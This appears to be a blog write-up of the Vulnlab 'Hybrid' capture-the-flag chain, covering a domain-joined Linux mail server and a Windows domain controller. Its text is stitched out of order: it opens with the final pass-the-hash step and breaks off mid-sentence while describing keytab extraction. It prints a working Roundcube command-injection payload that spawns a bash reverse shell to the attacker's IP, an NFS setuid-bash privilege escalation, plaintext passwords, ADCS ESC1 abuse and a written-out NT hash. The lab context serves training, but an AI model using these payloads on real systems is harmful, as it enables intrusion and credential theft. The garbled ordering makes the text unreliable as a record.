Administrator's NT hash.\n\n`certipy-ad auth -pfx administrator_dc01.pfx -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.238.53`\nThis will dump the NT hash in plaintext, to which we'll use the second part of the hash to authenticate.\n\n![](/images/vulnlab/hybrid-vl/v.png)\n\nLet's test our ability to authenticate to WinRM with these credentials using Pass-the-Hash on CrackMapExec.\n`crackmapexec winrm 10.10.238.53 -u 'Administrator' -H '60701e8543c9f6db1a2af3217386d3dc'`\n\n```\nSMB         10.10.238.53    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)\nHTTP        10.10.238.53    5985   DC01             [*] http://10.10.238.53:5985/wsman\nWINRM       10.10.238.53    5985   DC01             [+] hybrid.vl\\Administrator:60701e8543c9f6db1a2af3217386d3dc (Pwn3d!)\n```\n\nThat `Pwn3d!` notification denotes that we can now access the machine through WinRM.\n`evil-winrm --ip 10.10.238.53 -u 'Administrator' -H '60701e8543c9f6db1a2af3217386d3dc'`\n\n![](/images/vulnlab/hybrid-vl/w.png)\n\nThe root flag is within the Administrator's `Desktop` directory, meaning we now have completed this chain!\n\n# Conclusion\n\nThis machine was an awesome first experience at chains. Given that it was a domain-joined Linux, it required much more research into the attack path as I wasn't very familiar with this type of machine. It was a nice curveball, and the ADCS exploitation made it even more enjoyable. Big thanks goes out to xct for the development of this chain.\n\n# Resources\n\nhttps://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/\nhttps://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/\nhttps://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\nhttps://github.com/sosdave/KeyTabExtract\n","source":"_posts/hybrid.md","raw":"---\ntitle: Hybrid - Vulnlab\ndate: 2024-06-05 14:27:16\ntags: [vulnlab, Easy, CHAIN]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Linux, Windows'\ndescription: This chain was relatively fun and allowed me to learn a lot of different tactics that I would've previously not known how to do before. It involves attempting to gain initial access to a domain-joined Linux machine, following a pivot to the DC using ADCS.\ncover: /images/vulnlab/hybrid-vl/hybrid_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis chain was relatively fun and allowed me to learn a lot of different tactics that I would've previously not known how to do before. It involves attempting to gain initial access to a domain-joined Linux machine, following a pivot to the DC using ADCS.\n\n# Enumeration\n\nRunning our NMAP scanning to discover both machines `10.10.242.85` and `10.10.242.86`.\n\n```\n┌──(daz㉿LAPTOP-VA8M33JK)-[~/tech/vl/hybrid]\n└─$ cat initial_scan.txt\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:38 EDT\nNmap scan report for 10.10.231.245\nHost is up (0.095s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-29 04:39:03Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n|_ssl-date: TLS randomness does not represent time\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl\n| Not valid before: 2023-06-17T14:05:41\n|_Not valid after:  2024-06-16T14:05:41\n|_ssl-date: TLS randomness does not represent time\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=dc01.hybrid.vl\n| Not valid before: 2024-03-28T04:09:07\n|_Not valid after:  2024-09-27T04:09:07\n| rdp-ntlm-info:\n|   Target_Name: HYBRID\n|   NetBIOS_Domain_Name: HYBRID\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: hybrid.vl\n|   DNS_Computer_Name: dc01.hybrid.vl\n|   Product_Version: 10.0.20348\n|_  System_Time: 2024-03-29T04:39:51+00:00\n|_ssl-date: 2024-03-29T04:40:31+00:00; 0s from scanner time.\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (89%)\nAggressive OS guesses: Microsoft Windows Server 2022 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2024-03-29T04:39:54\n|_  start_date: N/A\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using port 139/tcp)\nHOP RTT      ADDRESS\n1   94.83 ms 10.8.0.1\n2   95.02 ms 10.10.231.245\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 104.10 seconds\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:40 EDT\nNmap scan report for 10.10.231.246\nHost is up (0.094s latency).\nNot shown: 990 closed tcp ports (reset)\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)\n|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)\n25/tcp   open  smtp     Postfix smtpd\n|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n80/tcp   open  http     nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Redirecting...\n110/tcp  open  pop3     Dovecot pop3d\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n|_pop3-capabilities: AUTH-RESP-CODE TOP STLS UIDL PIPELINING SASL RESP-CODES CAPA\n|_ssl-date: TLS randomness does not represent time\n111/tcp  open  rpcbind  2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      37551/udp6  mountd\n|   100005  1,2,3      49714/udp   mountd\n|   100005  1,2,3      50857/tcp6  mountd\n|   100005  1,2,3      53003/tcp   mountd\n|   100021  1,3,4      34841/tcp   nlockmgr\n|   100021  1,3,4      35283/tcp6  nlockmgr\n|   100021  1,3,4      37554/udp   nlockmgr\n|_  100021  1,3,4      45267/udp6  nlockmgr\n143/tcp  open  imap     Dovecot imapd (Ubuntu)\n|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR STARTTLS ID LOGINDISABLEDA0001 have post-login Pre-login ENABLE LITERAL+ listed IDLE OK capabilities\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n587/tcp  open  smtp     Postfix smtpd\n|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING\n993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR OK ID Pre-login have post-login ENABLE capabilities LITERAL+ listed IDLE AUTH=LOGINA0001 AUTH=PLAIN\n|_ssl-date: TLS randomness does not represent time\n995/tcp  open  ssl/pop3 Dovecot pop3d\n|_pop3-capabilities: AUTH-RESP-CODE TOP USER UIDL PIPELINING SASL(PLAIN LOGIN) RESP-CODES CAPA\n| ssl-cert: Subject: commonName=mail01\n| Subject Alternative Name: DNS:mail01\n| Not valid before: 2023-06-17T13:20:17\n|_Not valid after:  2033-06-14T13:20:17\n|_ssl-date: TLS randomness does not represent time\n2049/tcp open  nfs      3-4 (RPC #100003)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.94SVN%E=4%D=3/29%OT=22%CT=1%CU=30324%PV=Y%DS=2%DC=T%G=Y%TM=6606\nOS:4698%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)\nOS:OPS(O1=M4D4ST11NW7%O2=M4D4ST11NW7%O3=M4D4NNT11NW7%O4=M4D4ST11NW7%O5=M4D4\nOS:ST11NW7%O6=M4D4ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)\nOS:ECN(R=Y%DF=Y%T=40%W=F507%O=M4D4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%\nOS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T\nOS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=\nOS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF\nOS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40\nOS:%CD=S)\n\nNetwork Distance: 2 hops\nService Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 5900/tcp)\nHOP RTT      ADDRESS\n1   95.17 ms 10.8.0.1\n2   95.26 ms 10.10.231.246\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 87.40 seconds\n```\n\nWe can see here that there seems to be a Windows and a Linux machine, which probably hints at the fact that we are going to have to mess around with a domain-joined Linux machine.\n\nThe Windows machine appears to be the DC as the domain name for it is `dc01.hybrid.vl`, which means we'll turn our attention to the Linux machine first.\n\nThere seems to be an HTTP web server that is redirecting us somewhere. I also noticed that this machine's domain name is `mail01.hybrid.vl`, so we'll change this in our host file.\n\n![](/images/vulnlab/hybrid-vl/b.jpg)\n\nThis brings us to a Roundcube email login page, which we'll probably need to find credentials for.\n\n# External NFS Mounts\n\nBefore we mess with anything, I want to turn our attention to another potential vulnerable service on the machine - NFS.\n\nNFS is a file sharing service, much like CIFS(which essentially is SMB). Instead of directly viewing the shares through a command-line interface, we can use NFS to potentially view public shares and mount them to our machine.\n\nIn order to view the different mounts on NFS, we can browse the NFS interface using `showmount`\n`showmount -e 10.10.242.86`\n\nTo which we'll receive the following output:\n```\nExport list for 10.10.242.86:\n/opt/share *\n```\n\nThis means that we should be able to view all the contents of the `/opt/share` NFS share by mounting it to our machine.\n\n`sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock`\n* `mount -t nfs` to specifically mount an NFS share.\n* `-o vers=3` due to our NMAP scan, which denoted the NFS version as 3 or 4.\n* `10.10.231.246:/opt/share /mnt/tmpmnt` mounting everything is `/opt/share` to `/mnt/tmpmnt`, which is a directory that will be created on our local machine.\n* `-o nolock` to disable file-locking, which prevents the execution of binaries on the NFS share.\n\nWithin the contents of `/tmp/tmpmnt`, we can see a file called `backup.tar.gz`. We can unzip this with `tar` - `tar -xzf backup.tar.gz`. This gives us access to both `etc` and `opt` directories in the file archive.\n\nUpon enumerating the boxes, I've found an file that seems to give us credentials to the Roundcube login. This file is `/etc/dovecot/dovecot-users`\n```\nadmin@hybrid.vl:{plain}Duckling21\npeter.turner@hybrid.vl:{plain}PeterIstToll!\n```\n\nUsing these credentials (I'll use the admin's credentials), we are able to log in to the Roundcube instance.\n\n![](/images/vulnlab/hybrid-vl/c.png)\n\n# MarkasJunk RCE\n\nUpon looking around, I've stumbled across an email that `admin` has sent to `peter.turner`, entailing that they'll be enabling a Junk plugin on the Roundcube server.\n\n![](/images/vulnlab/hybrid-vl/d.png)\n\nNot only that, but it seems we have another user named `Ed` who we might potentially get access to later. Just something to note down.\n\nThis points us to our attack path to get foothold - RCE.\n\nUpon doing some research on this junk filter plugin, I found record of a CVE that allows you to get unauthorized remote code execution by configuring the user's name, sending an email, and then sending the mail to the junk folder. https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/\n\nThis essentially allows us to trigger an arbitrary command in the user's name due to a lack of filtering when this version of Roundcube is parsing an email. The article provided above entails the specifics on why this is the case, however it's really just important to note right now that we can execute commands by adding a `&` before and after our command in our email name so that Roundcube parses it incorrectly.\n\nLet's head over to `Compose > Edit Identities` (the little pencil icon next to our email) to perform this exploit.\n\nIf we try to add a command regularly as we interpreted above, such as:\n\n`admin&curl http://10.8.0.173:9001/&@hybrid.vl`\n\nRoundcube will tell us that our email address is invalid. While we could spend more time trying to understand specifically what characters it has on its blacklist, we can instead just push our commands in base64. I also found success in doing this in Burpsuite and URL encoding all special characters. This can be done in Burpsuite by capturing the request and then editing the `email` value.\n\nAfter messing around with a `curl` test payload, I managed to develop the following:\n\nThe command we are trying to execute is `curl http://10.8.0.173`, which I'm using to see if we can generate a callback to a simple Python server I'll stand up on our local machine. This brings us to the example name I've constructed below.\n`admin&echo${IFS}Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo=|base64${IFS}-d|bash&@hybrid.vl`\n\nWe'll also want to URL encode any characters so they can bypass any blacklists that Roundcube is attempting to detect on the front-end, and also so that Burpsuite can parse them correctly.\n`admin%26echo${IFS}Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo%3d|base64${IFS}-d|bash%26%40hybrid.vl`\n\n![](/images/vulnlab/hybrid-vl/e.png)\n\nUpon submitting the request, we can see that our name is accepted despite having special characters in it.\n\n![](/images/vulnlab/hybrid-vl/f.png)\n\nLet's compose an email now and send it back to ourselves to exploit the plugin. (All I did was compose an email and send it to `admin@hybrid.vl`).\n\nAdditionally, on my local machine, I'll start a simple python server on port `9001` to receive the request. `python3 -m http.server 9001`\n\n![](/images/vulnlab/hybrid-vl/g.png)\n\nWe'll now browse to the email in our inbox after sending it and click the `Junk` icon on the top of the email.\n\n![](/images/vulnlab/hybrid-vl/i.png)\n\nUpon clicking this, we can see that a GET request was sent from `10.10.242.86` back to our local machine. This means that we can execute commands and get a reverse shell on the target machine.\n  \n![](/images/vulnlab/hybrid-vl/j.png)\n\nLet's develop our command that we want to run, in this case I just used `Revshells.com` to generate a bash one-liner.\n\nWe'll also combine what we know previously to craft the following payload. Let's also set up a `netcat` listener to catch the web request and get us a shell. Command we are trying to run: `/bin/bash -i >& /dev/tcp/10.8.0.173/9001 0>&1`\n`admin%26echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMC4xNzMvOTAwMSAwPiYx|base64${IFS}-d|bash%26%40hybrid.vl`\n\nIf we do all of the same steps as outlined previously and use the `Junk` plugin in a new email, we can see that a reverse shell was spawned as user `wwwdata`.\n\n![](/images/vulnlab/hybrid-vl/q.png)\n\n# Internal Mounted NFS Exploit\n\nLooking around the box initially, there wasn't anything that I saw that screamed out at me out of the blue. I ended up dropping `Linpeas` to the box through a Sliver C2 beacon that I created, but didn't really see anything with it either.\n\nUpon searching some more, I decided to turn our attention back to NFS to potentially find any vulnerabilities with it. We can find the configurations for NFS in `/etc/export`\n\n```\n# /etc/exports: the access control list for filesystems which may be exported\n#\t\tto NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n/opt/share *(rw,no_subtree_check)  \n```\n\nWhile normally we'd look for NFS privilege escalation vectors such as `no_root_squash`, we can actually exploit the `rw` parameter that is set to `/opt/share`. https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/\n\nThis next exploit goes into depth on how NFS interprets the `rw` setting and by also exploiting `peter.turner@hybrid.vl`'s UID. If we run a `id` scan on `peter.turner@hybrid.vl`, we can see that they have a UID of `902601108`.\n\n```\nwww-data@mail01:~/roundcube$ id peter.turner@hybrid.vl\nid peter.turner@hybrid.vl\nuid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)\n```\n\nIf we create a user with the same UID, we can potentially exploit the `/bin/bash` binary by setting the sticky bit of `bash` and running it in the context of `peter.turner@hybrid.vl`. But how exactly does that make sense? Are we running `/bin/bash` as `peter.turner@hybrid.vl`? Yes and no. We're going to try and run `/bin/bash` as a user with the SAME UID as `peter.turner@hybrid.vl`. Meaning, if we create the same user on our local machine and modify the privileges to it using `rw`, we can run it in the context of `peter.turner@hybrid.vl`.\n\nSo to do this, we need to do the following:\n* Remote Host: `cp /bin/bash /opt/share/`\n\t* Copying the `/bin/bash` executable into the NFS share.\n* Local Host: `sudo useradd peter.turner@hybrid.vl -u 902601108`\n\t* Creating a user named `peter.turner@hybrid.vl` with the same UID as the UID on the remote machine.\n\t* NOTE: We will need to edit `/etc/login.defs` and change `UID_MAX` to a value greater than `902601108`.\n* Local Host: `sudo su -l peter.turner@hybrid.vl`\n\t* Logging into the new user we created.*\n* Local Host: `sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock`\n\t* Mounting the NFS share to `/mnt/tmpmnt` once more.\n* Local Host: `cp /mnt/tmpmnt/bash /tmp/tmpbash/`\n\t* Copying the `bash` executable to a temporary directory just so we can reset the privileges of the binary/\n* Remote Host: `rm /opt/share/bash`\n\t* Removing the `bash` executable from the remote machine so that we can replace it with a newly configured bash executable.\n* Local Host: `cp /tmp/tmpbash/bash /mnt/tmpmnt/`\n\t* Copying our executable back into the NFS share.\n* Local Host: `chmod +s /mnt/tmpmnt/bash`\n\t* Configuring the sticky bit of the `bash` executable. By configuring this privilege, it is essentially saying that any user that runs this binary will run it as the context of that user.\n* Remote Host: `/opt/share/bash -p`\n\t* We are running the `bash` binary with `-p`, which stands for `privileged mode`. This essentially means that it will set the effective user ID (EUID) to the real user ID. The binary will run with the permissions of the same user who invoked it based on the user ID. (In this case, `peter.turner@hybrid.vl`)\n\nThis should give us a shell as `peter.turner@hybrid.vl`, as denoted below.\n\n![](/images/vulnlab/hybrid-vl/r.png)\n\nThe only problem with having this type of shell is that we can't upgrade our shell in any way at the moment. Any attempt to do so will revert us back to `www-data`. That being said, I'll upload a Sliver C2 implant so we can download and upload files whenever we need to.\n\n# Reading KDBX\n\nIn the home directory, we can find the first flag to this chain as well as a `passwords.kdbx` file. We can use `kpcli` to open this file and read its contents.\n\nYou'll notice that if you try to show the `domain` entry, it will be blotted it in red. Copying this to any text file will reveal the real contents. An alternative is to use `KeaPassXC` if you're on Windows, though `kpcli` works fine as well.\n\n```\nkpcli:/> open passwords.kdbx\nkpcli:/> ls\n=== Groups ===\neMail/\nInternet/\nhybrid.vl/\n\nkpcli:/> cd hybrid.vl\nkpcli:/> ls\n\n=== Entries ===\n0. domain                                                                 \n1. mail                                                   mail01.hybrid.vl\n\nkpcli:/> show domain\n\n Path: /hybrid.vl/\nTitle: domain\nUname: peter.turner\n Pass: b0cwR+G4Dzl_rw\n  URL: \nNotes: \n```\n\nUpon testing these credentials to SSH on the machine, we can see that we have access through SSH as `peter.turner@hybrid.vl`. Slight note, my IP address did change since I took a break in between doing this.\n\n![](/images/vulnlab/hybrid-vl/s.png)\n\nUpon checking for privileges that we can exploit, it seems that this user can run all commands as `sudo`, which is a nice change of pace for once.\n\n```\npeter.turner@hybrid.vl@mail01:~$ sudo -l\n[sudo] password for peter.turner@hybrid.vl: \nMatching Defaults entries for peter.turner@hybrid.vl on mail01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser peter.turner@hybrid.vl may run the following commands on mail01:\n    (ALL) ALL\npeter.turner@hybrid.vl@mail01:~$ sudo su\nroot@mail01:/home/peter.turner@hybrid.vl# cd /root\nroot@mail01:~# ls\nflag.txt  snap\n```\n\nThe flag is in the `/root` directory as shown above, meaning we have compromised the first machine for this chain.\n\n# Pivoting to DC\n\nFor the next box, I'm assuming that we'll be able to start enumerating the machine with `peter.turner`'s valid credentials.\n\nThere is LDAP and SMB on the machine, so we could potentially verify whether this user is able to access anything. `crackmapexec smb 10.10.194.118 -u 'peter.turner' -p 'b0cwR+G4Dzl_rw'\n\n```\nSMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)\nSMB         10.10.194.117   445    DC01             [+] hybrid.vl\\peter.turner:b0cwR+G4Dzl_rw\n\nSMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.194.117   445    DC01             [-] hybrid.vl\\peter.turner:b0cwR+G4Dzl_rw Error connecting to the domain, are you sure LDAP service is running on the target ?\n```\n\nWe'll enumerate the SMB instance first to see if we can find anything. `smbclient -L 10.10.194.117 -U 'peter.turner'`\n\n```\nPassword for [WORKGROUP\\peter.turner]:\n\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tADMIN$          Disk      Remote Admin\n\tC$              Disk      Default share\n\tIPC$            IPC       Remote IPC\n\tNETLOGON        Disk      Logon server share \n\tSYSVOL          Disk      Logon server share\n```\n\nSeems like everything on SMB is relatively normal. NETLOGON and SYSVOL are normal shares, and we can't access any of the other shares. Just to verify though, I did go into NETLOGON and SYSVOL to ensure there wasn't anything there, which there wasn't.\n\nThe error we had before with LDAP is an error I've ran into before - we know that LDAP is running on the target based on the NMAP scan. Let's try and use `bloodhound-python` to enumerate the LDAP forest.\n`git clone https://github.com/dirkjanm/BloodHound.py.git`\n`python3 bloodhound.py -d 'hybrid.vl' -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -c all -ns 10.10.194.117 --zip`\n\nThis will dump the LDAP forest for us, and any valid domain objects that it can find based on the credentials that we have.\n\n```\nINFO: Found AD domain: hybrid.vl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: dc01.hybrid.vl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 2 computers\nINFO: Connecting to LDAP server: dc01.hybrid.vl\nINFO: Found 14 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: mail01\nINFO: Querying computer: dc01.hybrid.vl\nWARNING: Could not resolve: mail01: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.194.117@53 answered The DNS operation timed out.\nINFO: Done in 00M 19S\nINFO: Compressing output into 20240425021728_bloodhound.zip\n```\n\nWe can now use `bloodhound` with the compressed archive we just received to enumerate the LDAP forest. In case you have never used Bloodhound or Neo4J before, here's a resource to get started: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\n\nUpon uploading the data into Bloodhound, we can begin to enumerate if `peter.turner` has delegation over anything.\n\nOne thing I do want to note, there seems to be a user which we saw in the Roundcube instance named Ed. His full username seems to be `edward.miller@hybrid.vl`. I'm assuming we'll need to compromise him somehow, but that's still uphill. Bloodhound doesn't seem to note anything down at the moment for `peter.turner`'s privileges, so let's see what users we can find in the users file that Bloodhound dumped originally.\n\nI've compromised a list of these users based on the JSON that was provided, and modified it into a wordlist based on the user.\n\n```\nADMINISTRATOR@HYBRID.VL\nGUEST@HYBRID.VL\nKRBTGT@HYBRID.VL\nEDWARD.MILLER@HYBRID.VL\nPAMELA.SMITH@HYBRID.VL\nJOSH.MITCHELL@HYBRID.VL\nPETER.TURNER@HYBRID.VL\nOLIVIA.SMITH@HYBRID.VL\nRICKY.MYERS@HYBRID.VL\nEMILY.WHITE@HYBRID.VL\nELLIOT.WATKINS@HYBRID.VL\nKATHLEEN.WALKER@HYBRID.VL\nMARGARET.SHEPHERD@HYBRID.VL\n```\n\n```\nAdministrator\nGuest\nkrbtgt\nedward.miller\npamela.smith\njosh.mitchell\npeter.turner\nolivia.smith\nricky.myers\nemily.white\nelliot.watkins\nkathleen.walker\nmargaret.shepherd\n```\n\nDidn't seem like we could dump any `ASREP` hashes with `GetNPUsers`, nor could we dump any usable TGSs/TGTs for any of the users with `GetUserSPNs`.\n\nLet's turn our attention to another avenue we could target, ADCS.\n\n# ESC1 ADCS Exploitation\n\nADCS is a server role that essentially allows you to integrate PKI (Public Key Infrastructure) into an AD environment. This helps to maintain public key cryptography and digital signature/certificate capabilities. ADCS vulnerabilities can allow us to request a certificate used to authenticate on behalf of another user in the domain. Let's try to find any vulnerable certificate templates that we can use.\n\n`certipy-ad find -vulnerable -username 'peter.turner'@hybrid.vl -password b0cwR+G4Dzl_rw -dc-ip 10.10.194.117`\n\nWe'll see that this returns one result of a vulnerable certificate denoted as `HybridComputers`\n\n```\nCertificate Templates\n  0\n    Template Name                       : HybridComputers\n    Display Name                        : HybridComputers\n    Certificate Authorities             : hybrid-DC01-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : None\n    Private Key Flag                    : 16842752\n    Extended Key Usage                  : Client Authentication\n                                          Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 100 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 4096\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : HYBRID.VL\\Domain Admins\n                                          HYBRID.VL\\Domain Computers\n                                          HYBRID.VL\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : HYBRID.VL\\Administrator\n        Write Owner Principals          : HYBRID.VL\\Domain Admins\n                                          HYBRID.VL\\Enterprise Admins\n                                          HYBRID.VL\\Administrator\n        Write Dacl Principals           : HYBRID.VL\\Domain Admins\n                                          HYBRID.VL\\Enterprise Admins\n                                          HYBRID.VL\\Administrator\n        Write Property Principals       : HYBRID.VL\\Domain Admins\n                                          HYBRID.VL\\Enterprise Admins\n                                          HYBRID.VL\\Administrator\n    [!] Vulnerabilities\n      ESC1                              : 'HYBRID.VL\\\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication\n```\n\nYou'll notice the `ESC1` vulnerability indicator at the bottom of the template, which is telling us that `Domain Computers` can enroll supplies subject and also allows client authentication. This essentially means that any user can request a certificate on behalf of any other user in the network, even if that user is a privileged user (such as `Administrator`).\n\nSo technically speaking, we can use our `peter.turner` credentials to generate a certificate on behalf of `Administrator`, right? Unfortunately, it's not that simple in our case.\nAs you can see, the only role that can do this is `HYBRID.VL\\\\Domain Computers`, which means that only domain computers can perform this.\n\nNow this is relatively easy to move around, as we already have control of another computer on the domain - the recent `MAIL01` computer that we just compromised previously. We'll need to find the NTLM hash of this domain computer, which we would normally just dump through tools such as `mimikatz` on a Windows machine. On a Domain-joined Linux machine, the NTLM hashes for the domain computer can usually be found in `/etc/krb5.keytab` in my experience.\n\n![](/images/vulnlab/hybrid-vl/t.png)\n\nUpon trying to read the file, we'll find out that it's unreadable since it is encrypted.\nWe can easily circumvent this by using a tool called `keytabextract.py`, which will dump the contents of this file in 